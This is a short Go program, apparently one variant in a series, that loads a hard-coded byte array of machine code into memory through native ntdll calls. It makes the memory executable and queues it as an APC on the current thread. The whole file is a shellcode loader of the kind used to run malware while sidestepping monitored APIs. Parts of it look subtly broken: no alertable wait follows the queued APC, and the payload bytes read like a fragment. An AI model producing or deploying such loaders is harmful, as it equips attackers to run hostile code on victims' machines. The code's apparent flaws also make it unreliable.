package main

// Byte-array packing variant of the same technique: payload carried as a
// numeric array, staged through the native allocation/protection stubs, and
// entered through the plain NtQueueApcThread spelling.
import (
	"log"

	"golang.org/x/sys/windows"
	"unsafe"
)

var staged = []byte{0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xc7, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x77, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x00, 0x00, 0x48, 0x31, 0xd2, 0x6a, 0x00, 0x48, 0x8b, 0xfb, 0xff, 0xd3}

func main() {
	stage := windows.NewLazySystemDLL("ntdll.dll")
	allocFn := stage.NewProc("NtAllocateVirtualMemory")
	protFn := stage.NewProc("NtProtectVirtualMemory")
	apcFn := stage.NewProc("NtQueueApcThread")

	var base uintptr
	var procHandle = uintptr(0xffffffffffffffff)
	var oldProt uintptr
	length := uintptr(len(staged))

	_, _, err := allocFn.Call(
		procHandle,
		uintptr(unsafe.Pointer(&base)),
		0,
		uintptr(unsafe.Pointer(&length)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err.Error() != "The operation completed successfully." {
		log.Fatal("alloc failed:", err)
	}
	for i, b := range staged {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = b
	}

	_, _, err = protFn.Call(
		procHandle,
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&length)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProt)),
	)
	if err.Error() != "The operation completed successfully." {
		log.Fatal("protect failed:", err)
	}

	me := windows.CurrentThread()
	_, _, err = apcFn.Call(uintptr(me), base, 0)
	if err.Error() != "The operation completed successfully." {
		log.Fatal("queue failed:", err)
	}
}
